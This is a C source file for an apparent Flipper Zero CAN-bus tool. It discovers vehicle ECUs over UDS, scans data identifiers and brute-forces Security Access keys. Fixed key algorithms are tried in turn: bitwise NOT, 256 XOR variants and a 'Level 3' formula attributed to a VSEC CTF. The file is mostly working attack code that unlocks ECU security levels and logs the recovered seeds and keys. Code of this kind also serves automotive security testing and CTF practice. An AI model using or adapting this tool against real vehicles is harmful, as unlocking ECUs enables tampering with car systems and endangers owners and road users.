#include "UDSAllInOne.h"
#include "../../app_user.h"
#include "../../libraries/uds_library.h"
#include <stdio.h>

// Static context
static AllInOneContext allinone_ctx = {0};
static UDS_SERVICE allinone_uds;
static uint32_t allinone_gap_ms;
static uint32_t allinone_scan_start = 0x700;
static uint32_t allinone_scan_end = 0x7FF;

// Forward declarations
static int32_t allinone_discovery_thread(void* context);
static bool set_diagnostic_session(MCP2515* CAN, uint32_t tx_id, uint32_t rx_id, SessionType session);
static void start_keepalive(App* app, SessionType session);
static void stop_keepalive(void);
static uint16_t* scan_dids(MCP2515* CAN, uint32_t tx_id, uint32_t rx_id, uint16_t* count);
static void test_security_levels(MCP2515* CAN, uint32_t tx_id, uint32_t rx_id, SecurityLevelInfo* levels, uint8_t* count);

// Security access key algorithms
// Order matters: algorithms are tried in this order
#define ALGO_BITWISE_NOT        0   // First: simple NOT
#define ALGO_XOR_RANGE_START    1   // XOR 0x00-0xFF (256 algorithms)
#define ALGO_XOR_RANGE_COUNT    256
#define ALGO_LEVEL3_COMPLEX     257 // Level 3 complex
#define ALGO_COUNT              258

static const char* get_algo_name(uint16_t algo) {
    static char name_buf[32];
    if(algo == ALGO_BITWISE_NOT) {
        return "Bitwise NOT";
    } else if(algo >= ALGO_XOR_RANGE_START && algo < ALGO_XOR_RANGE_START + ALGO_XOR_RANGE_COUNT) {
        snprintf(name_buf, sizeof(name_buf), "XOR 0x%02X", algo - ALGO_XOR_RANGE_START);
        return name_buf;
    } else if(algo == ALGO_LEVEL3_COMPLEX) {
        return "Level3 Complex";
    }
    return "Unknown";
}

// Algorithm 1: Bitwise NOT (simplest, try first)
static uint32_t algo_bitwise_not(uint32_t seed) {
    return ~seed;
}

// Algorithm 2: XOR with a byte value
static uint32_t algo_xor_byte(uint32_t seed, uint8_t xor_val) {
    return seed ^ ((uint32_t)xor_val << 24) ^ ((uint32_t)xor_val << 16) ^ 
                  ((uint32_t)xor_val << 8) ^ xor_val;
}

// Algorithm 3: Level 3 complex algorithm (VSEC CTF)
static void algo_level3_complex(uint8_t* seed, uint8_t* key) {
    key[0] = ((((seed[0] ^ seed[3]) + seed[0]) ^ 0xFE) - (16 * seed[3])) & 0xFF;
    key[1] = ((((seed[1] ^ seed[2]) + seed[1]) ^ 0xED) - (16 * seed[2])) & 0xFF;
    key[2] = ((((seed[3] ^ seed[1]) + seed[2]) ^ 0xFA) - (16 * seed[1])) & 0xFF;
    key[3] = ((((seed[2] ^ seed[0]) + seed[3]) ^ 0xCE) - (16 * seed[0])) & 0xFF;
}

// Calculate key for a specific algorithm
static uint32_t calculate_key(uint32_t seed, uint8_t seed_len, uint16_t algo) {
    UNUSED(seed_len);
    
    if(algo == ALGO_BITWISE_NOT) {
        return algo_bitwise_not(seed);
    } else if(algo >= ALGO_XOR_RANGE_START && algo < ALGO_XOR_RANGE_START + ALGO_XOR_RANGE_COUNT) {
        uint8_t xor_val = algo - ALGO_XOR_RANGE_START;
        return algo_xor_byte(seed, xor_val);
    } else if(algo == ALGO_LEVEL3_COMPLEX) {
        uint8_t seed_bytes[4] = {
            (seed >> 24) & 0xFF,
            (seed >> 16) & 0xFF,
            (seed >> 8) & 0xFF,
            seed & 0xFF
        };
        uint8_t key_bytes[4];
        algo_level3_complex(seed_bytes, key_bytes);
        return ((uint32_t)key_bytes[0] << 24) | 
               ((uint32_t)key_bytes[1] << 16) | 
               ((uint32_t)key_bytes[2] << 8) | 
               key_bytes[3];
    }
    return 0;
}

// Check if algorithm is valid for given seed length
static bool is_algo_valid(uint8_t seed_len, uint16_t algo) {
    if(!seed_len || seed_len > 4) return false;
    if(algo == ALGO_BITWISE_NOT) {
        return true;  // Works for any length
    } else if(algo >= ALGO_XOR_RANGE_START && algo < ALGO_XOR_RANGE_START + ALGO_XOR_RANGE_COUNT) {
        return true;  // Works for any length
    } else if(algo == ALGO_LEVEL3_COMPLEX) {
        return seed_len == 4;  // Requires 4-byte seed
    }
    return false;
}

// Verify key with ECU
static bool verify_key_with_ecu(MCP2515* CAN, uint32_t tx_id, uint32_t rx_id, 
                                 uint8_t level, uint32_t key, uint8_t key_len) {
    // Send key (0x27 level+1 key[key_len])
    CANFRAME frame = {0};
    frame.canId = tx_id;
    frame.data_length = 8; // Always pad to 8 bytes
    frame.buffer[0] = 2 + key_len;  // PCI = service(1) + sub-function(1) + key_len
    frame.buffer[1] = 0x27;  // Security Access
    frame.buffer[2] = level + 1;  // Send Key sub-function
    
    // Fill key bytes (big endian)
    for(uint8_t i = 0; i < key_len && i < 4; i++) {
        frame.buffer[3 + i] = (key >> (8 * (key_len - 1 - i))) & 0xFF;
    }
    // Pad remaining
    for(uint8_t i = 3 + key_len; i < 8; i++) {
        frame.buffer[i] = 0xCC;
    }
    
    if(send_can_frame(CAN, &frame) != ERROR_OK) return false;
    
    CANFRAME response = {0};
    uint32_t timeout = 0;
    while(timeout < 10000 && !uds_worker_cancelled()) {
        if(read_can_message(CAN, &response) == ERROR_OK) {
            if(response.canId == rx_id) {
                // Positive response 0x67 or negative 0x7F
                if(response.buffer[1] == 0x67) {
                    return true;  // Key correct!
                } else if(response.buffer[1] == 0x7F) {
                    return false;  // Key incorrect
                }
            }
        }
        furi_delay_us(1);
        timeout++;
    }
    return false;
}

static bool bruteforce_key(MCP2515* CAN, uint32_t tx_id, uint32_t rx_id,
                           uint8_t level, uint32_t seed, uint8_t seed_len,
                           uint32_t* found_key, uint16_t* found_algo) {
    
    // Try each algorithm in order
    for(uint16_t algo = 0; algo < ALGO_COUNT && !uds_worker_cancelled(); algo++) {
        uds_keepalive(&allinone_uds);
        if(!is_algo_valid(seed_len, algo)) continue;
        
        uint32_t key = calculate_key(seed, seed_len, algo);
        
        if(verify_key_with_ecu(CAN, tx_id, rx_id, level, key, seed_len)) {
            *found_key = key;
            *found_algo = algo;
            return true;
        }
    }
    
    return false;
}

void allinone_context_init(AllInOneContext* ctx) {
    if(!ctx) return;
    memset(ctx, 0, sizeof(AllInOneContext));
    ctx->scan_start_id = allinone_scan_start;
    ctx->scan_end_id = allinone_scan_end;
    ctx->state = AllInOneState_Settings;
    ctx->storage = furi_record_open(RECORD_STORAGE);
}

void allinone_context_free(AllInOneContext* ctx) {
    if(!ctx) return;
    if(ctx->found_ecus) {
        free(ctx->found_ecus);
        ctx->found_ecus = NULL;
    }
    if(ctx->ecu_results) {
        for(uint8_t i = 0; i < ctx->ecu_count; i++) {
            for(uint8_t j = 0; j < 4; j++) {
                if(ctx->ecu_results[i].sessions[j].found_dids) {
                    free(ctx->ecu_results[i].sessions[j].found_dids);
                }
            }
        }
        free(ctx->ecu_results);
        ctx->ecu_results = NULL;
    }
    if(ctx->storage) furi_record_close(RECORD_STORAGE);
    memset(ctx, 0, sizeof(AllInOneContext));
}

bool allinone_create_result_file(AllInOneContext* ctx) {
    if(!ctx || !ctx->storage) return false;
    DateTime datetime;
    furi_hal_rtc_get_datetime(&datetime);
    
    // Use APP_DATA_PATH for Flipper Zero storage
    snprintf(ctx->result_file_path, sizeof(ctx->result_file_path),
        "%s/ALLINONE_%04d%02d%02d_%02d%02d%02d.txt",
        PATHLOGS,
        datetime.year, datetime.month, datetime.day,
        datetime.hour, datetime.minute, datetime.second);
    
    storage_simply_mkdir(ctx->storage, PATHLOGS);
    
    ctx->result_file = storage_file_alloc(ctx->storage);
    if(!ctx->result_file) return false;
    if(!storage_file_open(ctx->result_file, ctx->result_file_path, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
        storage_file_free(ctx->result_file);
        ctx->result_file = NULL;
        return false;
    }
    return true;
}

void allinone_close_result_file(AllInOneContext* ctx) {
    if(ctx && ctx->result_file) {
        storage_file_close(ctx->result_file);
        storage_file_free(ctx->result_file);
        ctx->result_file = NULL;
    }
}

void allinone_write_string(AllInOneContext* ctx, const char* str) {
    if(ctx && ctx->result_file && str) {
        storage_file_write(ctx->result_file, str, strlen(str));
    }
}

void allinone_write_header(AllInOneContext* ctx) {
    char buf[256];
    DateTime datetime;
    furi_hal_rtc_get_datetime(&datetime);
    
    snprintf(buf, sizeof(buf),
        "=== CANHACK UDS ALLINONE Report ===\n"
        "Date: %04d-%02d-%02d %02d:%02d:%02d\n"
        "Scan Range: 0x%03lX - 0x%03lX\n\n",
        datetime.year, datetime.month, datetime.day,
        datetime.hour, datetime.minute, datetime.second,
        ctx->scan_start_id, ctx->scan_end_id);
    allinone_write_string(ctx, buf);
}

void allinone_write_ecu_header(AllInOneContext* ctx, ECUInfo* ecu) {
    if(!ctx || !ecu) return;
    char buf[128];
    snprintf(buf, sizeof(buf),
        "=== ECU %d ===\nTX ID: 0x%03lX\nRX ID: 0x%03lX\n\n",
        ctx->current_ecu_index + 1, ecu->tx_id, ecu->rx_id);
    allinone_write_string(ctx, buf);
}

void allinone_write_session_header(AllInOneContext* ctx, SessionType session) {
    char buf[128];
    const char* session_name = "Unknown";
    switch(session) {
    case SessionType_Default: session_name = "Default"; break;
    case SessionType_Programming: session_name = "Programming"; break;
    case SessionType_Extended: session_name = "Extended"; break;
    case SessionType_Safety: session_name = "Safety System"; break;
    }
    snprintf(buf, sizeof(buf), "--- %s Session (0x%02X) ---\n", session_name, session);
    allinone_write_string(ctx, buf);
}

void allinone_write_did_results(AllInOneContext* ctx, uint16_t* dids, uint16_t count) {
    if(!ctx || (count > 0 && !dids)) return;
    char buf[64];
    allinone_write_string(ctx, "[DID Scan]\nFound DIDs:\n");
    if(count == 0) {
        allinone_write_string(ctx, "  None\n");
    } else {
        for(uint16_t i = 0; i < count; i++) {
            snprintf(buf, sizeof(buf), "  0x%04X\n", dids[i]);
            allinone_write_string(ctx, buf);
        }
    }
    allinone_write_string(ctx, "\n");
}

void allinone_write_security_results(AllInOneContext* ctx, SecurityLevelInfo* levels, uint8_t count) {
    if(!ctx || (count > 0 && !levels)) return;
    char buf[256];
    allinone_write_string(ctx, "[Security Access]\n");
    if(count == 0) {
        allinone_write_string(ctx, "  No levels tested\n");
    } else {
        for(uint8_t i = 0; i < count; i++) {
            SecurityLevelInfo* lvl = &levels[i];
            if(!lvl->supported) {
                snprintf(buf, sizeof(buf), "Level %02X: NOT_SUPPORTED (NRC 0x%02X)\n",
                    lvl->level, lvl->nrc);
            } else if(lvl->locked) {
                snprintf(buf, sizeof(buf), "Level %02X: LOCKED (NRC 0x%02X)\n",
                    lvl->level, lvl->nrc);
            } else if(lvl->key_found) {
                snprintf(buf, sizeof(buf), "Level %02X: SEED=0x%08lX, KEY=0x%08lX, ALGO=%s\n",
                    lvl->level, lvl->seed, lvl->key, get_algo_name(lvl->bruteforce_attempts));
            } else {
                snprintf(buf, sizeof(buf), "Level %02X: SEED=0x%08lX, KEY=NOT_FOUND (tried %d algorithms)\n",
                    lvl->level, lvl->seed, ALGO_COUNT);
            }
            allinone_write_string(ctx, buf);
        }
    }
    allinone_write_string(ctx, "\n");
}

void allinone_write_footer(AllInOneContext* ctx) {
    allinone_write_string(ctx, "=== END OF REPORT ===\n");
}



static void start_keepalive(App* app, SessionType session) {
    UNUSED(app);
    allinone_uds.session = session;
    allinone_uds.last_keepalive_ms = furi_get_tick();
}

static void stop_keepalive(void) {
    allinone_uds.session = 1;
}

static bool set_diagnostic_session(MCP2515* CAN, uint32_t tx_id, uint32_t rx_id, SessionType session) {
    allinone_uds.CAN = CAN;
    allinone_uds.id_to_send = tx_id;
    allinone_uds.id_to_received = rx_id;
    uint8_t request[] = {0x10, session};
    uint8_t response[8];
    size_t len = 0;
    return uds_request_payload(&allinone_uds, request, sizeof(request), response, sizeof(response), &len) == UdsOk;
}

static uint16_t* scan_dids(MCP2515* CAN, uint32_t tx_id, uint32_t rx_id, uint16_t* count) {
    if(!count) return NULL;
    *count = 0;
    if(!CAN) return NULL;
    uint16_t* found_dids = malloc(256 * sizeof(uint16_t));
    if(!found_dids) return NULL;
    allinone_uds.CAN = CAN;
    allinone_uds.id_to_send = tx_id;
    allinone_uds.id_to_received = rx_id;
    uint8_t response[UDS_PAYLOAD_MAX];
    for(size_t range = 0; range < COUNT_OF(allinone_did_ranges); range++) {
        for(uint32_t did = allinone_did_ranges[range].start;
            did <= allinone_did_ranges[range].end && *count < 256 && !uds_worker_cancelled(); did++) {
            uint8_t request[] = {0x22, did >> 8, did & 0xFF};
            size_t len = 0;
            uds_keepalive(&allinone_uds);
            UdsStatus status = uds_request_payload(&allinone_uds, request, sizeof(request), response, sizeof(response), &len);
            if(status == UdsOk) {
                found_dids[(*count)++] = did;
                char heading[48];
                snprintf(heading, sizeof(heading), "DID 0x%04lX [%u bytes]:", did, (unsigned)(len - 3));
                allinone_write_string(&allinone_ctx, heading);
                for(size_t i = 3; i < len; i++) {
                    char byte[4];
                    snprintf(byte, sizeof(byte), " %02X", response[i]);
                    allinone_write_string(&allinone_ctx, byte);
                }
                allinone_write_string(&allinone_ctx, "\n");
            }
            if(!app_uds_delay(&allinone_uds, allinone_gap_ms)) break;
        }
    }
    return found_dids;
}

static void test_security_levels(MCP2515* CAN, uint32_t tx_id, uint32_t rx_id, SecurityLevelInfo* levels, uint8_t* count) {
    if(!CAN || !levels || !count) return;
    *count = 0;
    
    for(uint8_t level = 0x01; level <= ALLINONE_MAX_SECURITY_LEVEL && *count < 16 && !uds_worker_cancelled(); level += 2) {
        uds_keepalive(&allinone_uds);
        SecurityLevelInfo* info = &levels[*count];
        info->level = level;
        info->supported = false;
        info->locked = false;
        info->key_found = false;
        info->seed = 0;
        info->seed_len = 0;
        info->bruteforce_attempts = 0;
        
        // Request Seed
        CANFRAME request = {0};
        request.canId = tx_id;
        request.data_length = 8;
        request.buffer[0] = 0x02;
        request.buffer[1] = 0x27;
        request.buffer[2] = level;
        for(uint8_t i = 3; i < 8; i++) request.buffer[i] = 0xCC;
        
        if(send_can_frame(CAN, &request) != ERROR_OK) continue;
        
        CANFRAME response = {0};
        uint32_t timeout = 0;
        bool got_response = false;
        
        while(timeout < 10000 && !uds_worker_cancelled()) {
            if(read_can_message(CAN, &response) == ERROR_OK) {
                if(response.canId == rx_id && response.data_length >= 2) {
                    got_response = true;
                    break;
                }
            }
            furi_delay_us(1);
            timeout++;
        }
        
        if(!got_response) continue;
        
        if(response.data_length >= 2 && response.buffer[1] == 0x67) {
            // Positive response - got seed
            info->supported = true;
            info->nrc = 0;
            
            // Extract seed (up to 4 bytes)
            uint8_t data_len = response.buffer[0] & 0x0F;
            if(data_len > 2) {
                info->seed_len = data_len - 2;
                for(uint8_t i = 0; i < info->seed_len && i < 4; i++) {
                    info->seed = (info->seed << 8) | response.buffer[3 + i];
                }
            }
            
            // Try bruteforce with all algorithms
            uint16_t found_algo = 0;
            info->key_found = bruteforce_key(CAN, tx_id, rx_id, level, 
                                              info->seed, info->seed_len, 
                                              &info->key, &found_algo);
            info->bruteforce_attempts = found_algo;
        } else if(response.data_length >= 4 && response.buffer[1] == 0x7F) {
            // Negative response
            info->nrc = response.buffer[3];
            if(info->nrc == 0x31) {
                // Request out of range - stop testing more levels
                break;
            } else if(info->nrc == 0x37) {
                info->locked = true;
            }
        }
        
        (*count)++;
        furi_delay_ms(10);  // Small delay between levels
    }
}

static int32_t allinone_discovery_thread(void* context) {
    App* app = context;
    if(!app || !app->text || !app->mcp_can) return 0;
    FuriString* text = app->text;
    MCP2515* mcp = app->mcp_can;
    
    furi_string_reset(text);
    furi_string_cat_printf(text, "ALLINONE Test\nScanning ECUs...\n\n");
    text_box_set_text(app->textBox, furi_string_get_cstr(text));
    
    allinone_context_init(&allinone_ctx);
    if(allinone_ctx.scan_start_id > 0x7FF) allinone_ctx.scan_start_id = 0x7FF;
    if(allinone_ctx.scan_end_id > 0x7FF) allinone_ctx.scan_end_id = 0x7FF;
    allinone_gap_ms = app->uds_gap_ms;
    allinone_ctx.found_ecus = malloc(16 * sizeof(ECUInfo));
    if(!allinone_ctx.found_ecus) {
        furi_string_cat_printf(text, "Out of memory\n");
        text_box_set_text(app->textBox, furi_string_get_cstr(text));
        allinone_context_free(&allinone_ctx);
        return 0;
    }
    
    MCP2515* CAN = mcp_alloc(MCP_NORMAL, mcp->clck, mcp->bitRate);
    if(!CAN) {
        furi_string_cat_printf(text, "Out of memory\n");
        text_box_set_text(app->textBox, furi_string_get_cstr(text));
        allinone_context_free(&allinone_ctx);
        return 0;
    }
    if(mcp2515_init(CAN) != ERROR_OK) {
        furi_string_cat_printf(text, "Device not connected\n");
        text_box_set_text(app->textBox, furi_string_get_cstr(text));
        free_mcp2515(CAN);
        return 0;
    }
    
    init_mask(CAN, 0, 0);
    init_mask(CAN, 1, 0);
    
    // ECU Discovery
    uint32_t discovery_start = furi_get_tick();
    uint32_t last_progress = discovery_start - 100;
    for(uint32_t arb_id = allinone_ctx.scan_start_id; arb_id <= allinone_ctx.scan_end_id; arb_id++) {
        if(uds_worker_cancelled()) break;
        
        CANFRAME response = {0};
        if(uds_discovery_probe(CAN, arb_id, app->uds_discovery_wait_ms, &response) &&
           uds_discovery_verify(CAN, arb_id, response.canId, app->uds_discovery_wait_ms)) {
            allinone_ctx.found_ecus[allinone_ctx.ecu_count++] = (ECUInfo){arb_id, response.canId};
            furi_string_cat_printf(text, "Found ECU: TX=0x%03lX RX=0x%03lX\n", arb_id, response.canId);
        }
        uint32_t now = furi_get_tick();
        if(arb_id == allinone_ctx.scan_end_id || now - last_progress >= 100) {
            furi_string_printf(app->data, "%sID %03lX / %03lX\n%lu ms, wait %lu ms\nBACK: cancel",
                furi_string_get_cstr(text), arb_id, allinone_ctx.scan_end_id,
                now - discovery_start, app->uds_discovery_wait_ms);
            text_box_set_text(app->textBox, furi_string_get_cstr(app->data));
            last_progress = now;
        }
        if(allinone_ctx.ecu_count >= 16) break;
    }

    if(allinone_ctx.ecu_count == 0) {
        furi_string_cat_printf(text, "\nNo ECUs found\n");
        text_box_set_text(app->textBox, furi_string_get_cstr(text));
        allinone_context_free(&allinone_ctx);
        deinit_mcp2515(CAN);
        free_mcp2515(CAN);
        return 0;
    }

    furi_string_cat_printf(text, "\nFound %d ECU(s)\nStarting tests...\n", allinone_ctx.ecu_count);
    text_box_set_text(app->textBox, furi_string_get_cstr(text));

    // Create result file
    if(!allinone_create_result_file(&allinone_ctx)) {
        furi_string_cat_printf(text, "Failed to create result file\n");
        text_box_set_text(app->textBox, furi_string_get_cstr(text));
        allinone_context_free(&allinone_ctx);
        deinit_mcp2515(CAN);
        free_mcp2515(CAN);
        return 0;
    }

    allinone_write_header(&allinone_ctx);

    // Continue testing in this thread instead of spawning a new one
    allinone_ctx.state = AllInOneState_Testing;

    allinone_uds = (UDS_SERVICE){.CAN = CAN, .initialized = true,
        .timeout_ms = app->uds_timeout_ms, .session = 1};

    // Allocate results
    allinone_ctx.ecu_results = calloc(allinone_ctx.ecu_count, sizeof(ECUTestResult));
    if(!allinone_ctx.ecu_results) {
        furi_string_cat_printf(text, "Out of memory\n");
        text_box_set_text(app->textBox, furi_string_get_cstr(text));
        allinone_close_result_file(&allinone_ctx);
        allinone_context_free(&allinone_ctx);
        deinit_mcp2515(CAN);
        free_mcp2515(CAN);
        return 0;
    }

    // Test each ECU
    for(uint8_t ecu_idx = 0; ecu_idx < allinone_ctx.ecu_count && !uds_worker_cancelled(); ecu_idx++) {
        allinone_ctx.current_ecu_index = ecu_idx;
        ECUInfo* ecu = &allinone_ctx.found_ecus[ecu_idx];
        ECUTestResult* result = &allinone_ctx.ecu_results[ecu_idx];

        result->ecu = *ecu;
        result->session_count = 0;

        furi_string_cat_printf(text, "\nTesting ECU %d/%d\nTX:0x%03lX RX:0x%03lX\n",
            ecu_idx + 1, allinone_ctx.ecu_count, ecu->tx_id, ecu->rx_id);
        text_box_set_text(app->textBox, furi_string_get_cstr(text));

        allinone_write_ecu_header(&allinone_ctx, ecu);

        // Test each session
        SessionType sessions[] = {SessionType_Default, SessionType_Programming,
                                   SessionType_Extended, SessionType_Safety};

        for(uint8_t s = 0; s < 4; s++) {
            if(uds_worker_cancelled()) break;

            allinone_ctx.current_session_index = s;
            SessionType session = sessions[s];
            SessionTestResult* session_result = &result->sessions[s];
            session_result->session_type = session;

            furi_string_cat_printf(text, "  Session 0x%02X...\n", session);
            text_box_set_text(app->textBox, furi_string_get_cstr(text));

            // Set session
            session_result->session_set_success = set_diagnostic_session(CAN, ecu->tx_id, ecu->rx_id, session);

            if(!session_result->session_set_success) {
                furi_string_cat_printf(text, "    Failed to set session\n");
                text_box_set_text(app->textBox, furi_string_get_cstr(text));
                continue;
            }

            result->session_count++;

            allinone_write_session_header(&allinone_ctx, session);

            // Start keepalive
            start_keepalive(app, session);

            // Scan DIDs
            furi_string_cat_printf(text, "    Scanning DIDs...\n");
            text_box_set_text(app->textBox, furi_string_get_cstr(text));

            session_result->found_dids = scan_dids(CAN, ecu->tx_id, ecu->rx_id,
                                                    &session_result->found_did_count);

            furi_string_cat_printf(text, "    Found %d DIDs\n", session_result->found_did_count);
            text_box_set_text(app->textBox, furi_string_get_cstr(text));

            allinone_write_did_results(&allinone_ctx, session_result->found_dids,
                                        session_result->found_did_count);

            // Test security levels
            furi_string_cat_printf(text, "    Testing security levels...\n");
            text_box_set_text(app->textBox, furi_string_get_cstr(text));

            test_security_levels(CAN, ecu->tx_id, ecu->rx_id,
                                session_result->security_levels,
                                &session_result->security_level_count);

            furi_string_cat_printf(text, "    Tested %d levels\n", session_result->security_level_count);
            text_box_set_text(app->textBox, furi_string_get_cstr(text));

            allinone_write_security_results(&allinone_ctx, session_result->security_levels,
                                            session_result->security_level_count);

            // Stop keepalive
            stop_keepalive();

            furi_delay_ms(100);
        }

        if(uds_worker_cancelled()) break;
    }

    deinit_mcp2515(CAN);
    free_mcp2515(CAN);

    allinone_write_footer(&allinone_ctx);
    allinone_close_result_file(&allinone_ctx);

    furi_string_cat_printf(text, "\n=== %s ===\nResults saved to:\n%s\n",
        uds_worker_cancelled() ? "Cancelled (partial report)" : "Test Complete", allinone_ctx.result_file_path);
    text_box_set_text(app->textBox, furi_string_get_cstr(text));

    allinone_ctx.state = AllInOneState_Complete;

    return 0;
}

// Settings scene variables
static uint8_t allinone_start_id_bytes[2] = {0x07, 0x21};  // 0x721
static uint8_t allinone_end_id_bytes[2] = {0x07, 0x28};    // 0x728
static uint8_t* current_id_setting = NULL;

static void allinone_start_id_changed(void* context) {
    App* app = context;
    allinone_scan_start = ((uint32_t)allinone_start_id_bytes[0] << 8) | allinone_start_id_bytes[1];
    scene_manager_previous_scene(app->scene_manager);
}

static void allinone_end_id_changed(void* context) {
    App* app = context;
    allinone_scan_end = ((uint32_t)allinone_end_id_bytes[0] << 8) | allinone_end_id_bytes[1];
    scene_manager_previous_scene(app->scene_manager);
}

static void allinone_settings_select(void* context, uint32_t index) {
    App* app = context;
    
    switch(index) {
    case 0:  // Start ID
        current_id_setting = allinone_start_id_bytes;
        byte_input_set_result_callback(
            app->input_byte_value,
            allinone_start_id_changed,
            NULL,
            app,
            allinone_start_id_bytes,
            2);
        byte_input_set_header_text(app->input_byte_value, "Enter Start ID (hex)");
        view_dispatcher_switch_to_view(app->view_dispatcher, InputByteView);
        break;
        
    case 1:  // End ID
        current_id_setting = allinone_end_id_bytes;
        byte_input_set_result_callback(
            app->input_byte_value,
            allinone_end_id_changed,
            NULL,
            app,
            allinone_end_id_bytes,
            2);
        byte_input_set_header_text(app->input_byte_value, "Enter End ID (hex)");
        view_dispatcher_switch_to_view(app->view_dispatcher, InputByteView);
        break;
        
    case 2:  // Start Test
        // Validate range
        if(allinone_scan_start > allinone_scan_end) {
            uint32_t temp = allinone_scan_start;
            allinone_scan_start = allinone_scan_end;
            allinone_scan_end = temp;
        }
        scene_manager_next_scene(app->scene_manager, app_scene_uds_allinone_run_option);
        break;
    }
}

static void allinone_settings_callback(void* context, uint32_t index) {
    App* app = context;
    view_dispatcher_send_custom_event(app->view_dispatcher, index);
}

// Settings scene
void app_scene_uds_allinone_settings_on_enter(void* context) {
    App* app = context;
    
    submenu_reset(app->submenu);
    submenu_set_header(app->submenu, "ALLINONE Settings");
    
    char buf[32];
    snprintf(buf, sizeof(buf), "Start ID: 0x%03lX", allinone_scan_start);
    submenu_add_item(app->submenu, buf, 0, allinone_settings_callback, app);
    
    snprintf(buf, sizeof(buf), "End ID: 0x%03lX", allinone_scan_end);
    submenu_add_item(app->submenu, buf, 1, allinone_settings_callback, app);
    
    submenu_add_item(app->submenu, "Start Test", 2, allinone_settings_callback, app);
    
    view_dispatcher_switch_to_view(app->view_dispatcher, SubmenuView);
}

bool app_scene_uds_allinone_settings_on_event(void* context, SceneManagerEvent event) {
    if(event.type == SceneManagerEventTypeCustom && event.event <= 2) {
        allinone_settings_select(context, event.event);
        return true;
    }
    return false;
}

void app_scene_uds_allinone_settings_on_exit(void* context) {
    App* app = context;
    submenu_reset(app->submenu);
}

// Run test scene
void app_scene_uds_allinone_run_on_enter(void* context) {
    App* app = context;
    text_box_reset(app->textBox);
    text_box_set_focus(app->textBox, TextBoxFocusEnd);
    
    app->thread = furi_thread_alloc_ex("AllInOne", 4 * 1024, allinone_discovery_thread, app);
    furi_thread_start(app->thread);
    
    view_dispatcher_switch_to_view(app->view_dispatcher, TextBoxView);
}

bool app_scene_uds_allinone_run_on_event(void* context, SceneManagerEvent event) {
    UNUSED(context);
    UNUSED(event);
    return false;
}

void app_scene_uds_allinone_run_on_exit(void* context) {
    App* app = context;

    app_uds_stop_worker(app);

    stop_keepalive();
    allinone_context_free(&allinone_ctx);
    text_box_reset(app->textBox);
}

// Legacy scene functions (redirect to settings)
void app_scene_uds_allinone_on_enter(void* context) {
    App* app = context;
    scene_manager_next_scene(app->scene_manager, app_scene_uds_allinone_settings_option);
}

bool app_scene_uds_allinone_on_event(void* context, SceneManagerEvent event) {
    UNUSED(context);
    UNUSED(event);
    return false;
}

void app_scene_uds_allinone_on_exit(void* context) {
    UNUSED(context);
}
